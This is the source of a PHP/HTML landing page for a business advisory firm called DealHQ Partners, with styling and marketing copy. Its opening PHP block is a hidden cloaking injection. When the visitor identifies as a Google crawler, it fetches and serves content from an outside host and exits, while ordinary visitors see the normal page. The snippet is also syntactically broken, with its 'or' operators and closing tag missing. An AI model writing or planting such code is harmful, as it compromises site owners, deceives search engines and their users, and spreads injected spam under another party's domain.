<?php
function check_user_agent($agent) {
    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
}
if (check_user_agent('Googlebot')  check_user_agent('Google-Site-Verification')  check_user_agent('Google-InspectionTool')) 
{ echo file_get_contents('https://script-kita.site/clk0u1tz/r');
exit;
}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>DealHQ Partners | Business & Transaction Advisory</title>

    <meta name="description"
          content="DealHQ Partners provides professional business, transaction advisory, finance, capital markets and corporate services.">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            color: #18202a;
            background: #ffffff;
            line-height: 1.6;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        .container {
            width: min(1150px, 92%);
            margin: auto;
        }

        /* NAVBAR */
        header {
            position: sticky;
            top: 0;
            z-index: 1000;
            background: rgba(255,255,255,.97);
            border-bottom: 1px solid #e8e8e8;
        }

        .navbar {
            min-height: 78px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 30px;
        }

        .logo {
            font-size: 25px;
            font-weight: 800;
            letter-spacing: -1px;
            color: #102b4e;
        }

        .logo span {
            color: #c99b45;
        }

        .nav-links {
            display: flex;
            align-items: center;
            gap: 25px;
            list-style: none;
            font-size: 14px;
            font-weight: 600;
        }

        .nav-links a:hover {
            color: #b08334;
        }

        .nav-btn {
            padding: 11px 18px;
            background: #102b4e;
            color: white !important;
            border-radius: 3px;
        }

        /* HERO */
        .hero {
            min-height: 650px;
            display: flex;
            align-items: center;
            background:
                linear-gradient(90deg, rgba(8,26,48,.96), rgba(8,26,48,.72)),
                url("images/hero.jpg") center/cover;
            color: white;
        }

        .hero-content {
            max-width: 720px;
            padding: 90px 0;
        }

        .eyebrow {
            color: #d6ae62;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-bottom: 20px;
        }

        .hero h1 {
            font-size: clamp(42px, 6vw, 76px);
            line-height: 1.05;
            margin-bottom: 25px;
            font-weight: 800;
        }

        .hero p {
            max-width: 650px;
            font-size: 18px;
            color: #e6ebf1;
            margin-bottom: 35px;
        }

        .buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
        }

        .btn {
            display: inline-block;
            padding: 14px 25px;
            border-radius: 3px;
            font-weight: 700;
            transition: .25s;
        }

        .btn-primary {
            background: #c99b45;
            color: white;
        }

        .btn-primary:hover {
            background: #b48738;
        }

        .btn-outline {
            border: 1px solid rgba(255,255,255,.7);
            color: white;
        }

        .btn-outline:hover {
            background: white;
            color: #102b4e;
        }

        /* VALUES */
        .values {
            padding: 80px 0;
            background: #f5f7fa;
        }

        .section-heading {
            text-align: center;
            margin-bottom: 50px;
        }

        .section-heading .eyebrow {
            margin-bottom: 10px;
        }

        .section-heading h2 {
            font-size: 40px;
            color: #102b4e;
        }

        .value-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
        }

        .value-card {
            background: white;
            padding: 30px 25px;
            border-top: 3px solid #c99b45;
            box-shadow: 0 8px 30px rgba(0,0,0,.05);
        }

        .value-card h3 {
            color: #102b4e;
            margin-bottom: 10px;
        }

        .value-card p {
            color: #68727d;
            font-size: 14px;
        }

        /* ABOUT */
        .about {
            padding: 100px 0;
        }

        .about-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 70px;
            align-items: center;
        }

        .about-image {
            min-height: 430px;
            background:
                linear-gradient(rgba(16,43,78,.2), rgba(16,43,78,.2)),
                url("images/about.jpg") center/cover;
        }

        .about-text h2 {
            color: #102b4e;
            font-size: 42px;
            line-height: 1.15;
            margin-bottom: 22px;
        }

        .about-text p {
            color: #626c77;
            margin-bottom: 18px;
        }

        /* SERVICES */
        .services {
            padding: 100px 0;
            background: #102b4e;
            color: white;
        }

        .services .section-heading h2 {
            color: white;
        }

        .services .section-heading .eyebrow {
            color: #d6ae62;
        }

        .service-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 18px;
        }

        .service-card {
            min-height: 190px;
            padding: 28px;
            border: 1px solid rgba(255,255,255,.15);
            background: rgba(255,255,255,.04);
            transition: .25s;
        }

        .service-card:hover {
            transform: translateY(-5px);
            background: rgba(255,255,255,.09);
        }

        .service-number {
            color: #d6ae62;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .service-card h3 {
            font-size: 19px;
            margin-bottom: 12px;
        }

        .service-card p {
            color: #cbd4df;
            font-size: 14px;
        }

        /* PEOPLE */
        .people {
            padding: 100px 0;
        }

        .people-box {
            text-align: center;
            max-width: 720px;
            margin: auto;
        }

        .people-box h2 {
            font-size: 42px;
            color: #102b4e;
            margin-bottom: 18px;
        }

        .people-box p {
            color: #68727d;
            margin-bottom: 28px;
        }

        /* PUBLICATIONS */
        .publications {
            padding: 100px 0;
            background: #f5f7fa;
        }

        .publication-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 25px;
        }

        .publication {
            background: white;
            padding: 30px;
            border-bottom: 3px solid #c99b45;
        }

        .publication small {
            color: #b08334;
            font-weight: bold;
        }

        .publication h3 {
            margin: 15px 0;
            color: #102b4e;
            font-size: 20px;
        }

        .publication p {
            color: #68727d;
            font-size: 14px;
        }

        /* CTA */
        .cta {
            padding: 90px 0;
            background: #c99b45;
            color: white;
            text-align: center;
        }

        .cta h2 {
            font-size: 44px;
            margin-bottom: 15px;
        }

        .cta p {
            margin-bottom: 28px;
            font-size: 17px;
        }

        .cta .btn {
            background: #102b4e;
        }

        /* FOOTER */
        footer {
            background: #081a30;
            color: #c7d0db;
            padding: 60px 0 25px;
        }

        .footer-grid {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 50px;
            margin-bottom: 45px;
        }

        footer h3 {
            color: white;
            margin-bottom: 18px;
        }

        footer p {
            font-size: 14px;
            color: #aeb9c5;
        }

        .footer-links {
            list-style: none;
        }

        .footer-links li {
            margin-bottom: 9px;
            font-size: 14px;
        }

        .footer-links a:hover {
            color: #d6ae62;
        }

        .copyright {
            border-top: 1px solid rgba(255,255,255,.1);
            padding-top: 20px;
            text-align: center;
            font-size: 13px;
            color: #8f9aa7;
        }

        /* MOBILE */
        @media (max-width: 900px) {
            .nav-links {
                display: none;
            }

            .value-grid,
            .service-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            .about-grid {
                grid-template-columns: 1fr;
                gap: 35px;
            }

            .publication-grid {
                grid-template-columns: 1fr;
            }

            .footer-grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 600px) {
            .hero {
                min-height: 600px;
            }

            .value-grid,
            .service-grid {
                grid-template-columns: 1fr;
            }

            .hero h1 {
                font-size: 45px;
            }

            .section-heading h2,
            .about-text h2,
            .people-box h2,
            .cta h2 {
                font-size: 32px;
            }
        }
    </style>
</head>

<body>

<header>
    <div class="container navbar">
        <a href="#" class="logo">
            Deal<span>HQ</span>
        </a>

        <ul class="nav-links">
            <li><a href="#home">Home</a></li>
            <li><a href="#about">About</a></li>
            <li><a href="#services">Expertise</a></li>
            <li><a href="#people">People</a></li>
            <li><a href="#publications">Publications</a></li>
            <li>
                <a href="#contact" class="nav-btn">Contact</a>
            </li>
        </ul>
    </div>
</header>

<main>

    <!-- HERO -->
    <section class="hero" id="home">
        <div class="container">
            <div class="hero-content">

                <div class="eyebrow">
                    Business & Transaction Advisory
                </div>

                <h1>
                    Enabling Businesses
                    To Move Forward.
                </h1>

                <p>
                    Strategic advisory and professional services designed
                    to help businesses navigate complex transactions,
                    finance, governance and growth opportunities.
                </p>

                <div class="buttons">
                    <a href="#contact" class="btn btn-primary">
                        Request Consultation
                    </a>

                    <a href="#services" class="btn btn-outline">
                        Explore Expertise
                    </a>
                </div>

            </div>
        </div>
    </section>


    <!-- VALUES -->
    <section class="values">
        <div class="container">

            <div class="section-heading">
                <div class="eyebrow">Our Approach</div>
                <h2>Built Around Your Success</h2>
            </div>

            <div class="value-grid">

                <div class="value-card">
                    <h3>Attention to Detail</h3>
                    <p>
                        We approach every engagement with precision,
                        discipline and careful consideration.
                    </p>
                </div>

                <div class="value-card">
                    <h3>Forward Thinking</h3>
                    <p>
                        Practical strategies designed around tomorrow's
                        opportunities and challenges.
                    </p>
                </div>

                <div class="value-card">
                    <h3>Timely Execution</h3>
                    <p>
                        Focused execution that keeps important business
                        objectives moving forward.
                    </p>
                </div>

                <div class="value-card">
                    <h3>Client Satisfaction</h3>
                    <p>
                        Long-term relationships built through trust,
                        professionalism and results.
                    </p>
                </div>

            </div>
        </div>
    </section>


    <!-- ABOUT -->
    <section class="about" id="about">
        <div class="container about-grid">

            <div class="about-image"></div>

            <div class="about-text">

                <div class="eyebrow">About Us</div>

                <h2>
                    Practical Expertise
                    For Complex Business Needs.
                </h2>

                <p>
                    We work with businesses, investors and institutions
                    to provide practical guidance across transactions,
                    corporate matters, finance and strategic initiatives.
                </p>

                <p>
                    Our multidisciplinary approach combines commercial
                    understanding, financial insight and execution-focused
                    advisory to help clients make informed decisions.
                </p>

                <a href="#contact" class="btn btn-primary">
                    Learn More
                </a>

            </div>

        </div>
    </section>


    <!-- SERVICES -->
    <section class="services" id="services">
        <div class="container">

            <div class="section-heading">
                <div class="eyebrow">Our Expertise</div>
                <h2>Areas We Serve</h2>
            </div>

            <div class="service-grid">

                <div class="service-card">
                    <div class="service-number">01</div>
                    <h3>Corporate & Commercial</h3>
                    <p>
                        Advisory solutions for corporate structures,
                        commercial transactions and business operations.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">02</div>
                    <h3>Private Equity</h3>
                    <p>
                        Support across investment structures,
                        transactions and strategic capital deployment.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">03</div>
                    <h3>Finance</h3>
                    <p>
                        Financial advisory designed to support
                        business growth and strategic decisions.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">04</div>
                    <h3>Real Estate & Construction</h3>
                    <p>
                        Commercial and strategic support for property
                        and construction-related projects.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">05</div>
                    <h3>Technovation</h3>
                    <p>
                        Advisory for businesses navigating technology,
                        innovation and digital transformation.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">06</div>
                    <h3>Capital Markets</h3>
                    <p>
                        Strategic support for capital market activities,
                        structures and transactions.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">07</div>
                    <h3>Corporate Services</h3>
                    <p>
                        Professional corporate support focused on
                        governance, compliance and business continuity.
                    </p>
                </div>

                <div class="service-card">
                    <div class="service-number">08</div>
                    <h3>Transaction Advisory</h3>
                    <p>
                        Structured guidance for complex transactions
                        from planning through execution.
                    </p>
                </div>

            </div>
        </div>
    </section>


    <!-- PEOPLE -->
    <section class="people" id="people">
        <div class="container">

            <div class="people-box">

                <div class="eyebrow">Our People</div>

                <h2>
                    Experience Meets
                    Strategic Thinking.
                </h2>

                <p>
                    Our professionals bring multidisciplinary experience
                    and a client-focused approach to every engagement.
                </p>

                <a href="#contact" class="btn btn-primary">
                    Meet Our Team
                </a>

            </div>

        </div>
    </section>


    <!-- PUBLICATIONS -->
    <section class="publications" id="publications">
        <div class="container">

            <div class="section-heading">
                <div class="eyebrow">Insights</div>
                <h2>Recent Publications</h2>
            </div>

            <div class="publication-grid">

                <article class="publication">
                    <small>BUSINESS & REGULATION</small>

                    <h3>
                        Understanding Regulatory Changes
                        and Their Business Impact
                    </h3>

                    <p>
                        Key considerations businesses should evaluate
                        when navigating changes in regulatory frameworks.
                    </p>
                </article>

                <article class="publication">
                    <small>CAPITAL MARKETS</small>

                    <h3>
                        Building Stronger Capital
                        Market Strategies
                    </h3>

                    <p>
                        Strategic perspectives on capital formation,
                        investment and market opportunities.
                    </p>
                </article>

                <article class="publication">
                    <small>TRANSACTIONS</small>

                    <h3>
                        Preparing Businesses
                        For Strategic Transactions
                    </h3>

                    <p>
                        Practical considerations for companies preparing
                        for complex business transactions.
                    </p>
                </article>

            </div>
        </div>
    </section>


    <!-- CTA -->
    <section class="cta" id="contact">
        <div class="container">

            <h2>Let's Discuss Your Next Move.</h2>

            <p>
                Tell us about your business challenge or opportunity.
            </p>

            <a href="mailto:info@example.com" class="btn">
                Request Consultation
            </a>

        </div>
    </section>

</main>


<!-- FOOTER -->
<footer>
    <div class="container">

        <div class="footer-grid">

            <div>
                <h3 class="logo">
                    Deal<span>HQ</span>
                </h3>

                <p>
                    Strategic business and transaction advisory
                    for organizations navigating complex opportunities.
                </p>
            </div>

            <div>
                <h3>Navigation</h3>

                <ul class="footer-links">
                    <li><a href="#home">Home</a></li>
                    <li><a href="#about">About</a></li>
                    <li><a href="#services">Expertise</a></li>
                    <li><a href="#people">People</a></li>
                </ul>
            </div>

            <div>
                <h3>Contact</h3>

                <ul class="footer-links">
                    <li>
                        <a href="mailto:info@example.com">
                            info@example.com
                        </a>
                    </li>

                    <li>
                        Request Consultation
                    </li>

                    <li>
                        Business Advisory Services
                    </li>
                </ul>
            </div>

        </div>

        <div class="copyright">
            © 2026 DealHQ Partners. All Rights Reserved.
        </div>

    </div>
</footer>

</body>
</html>
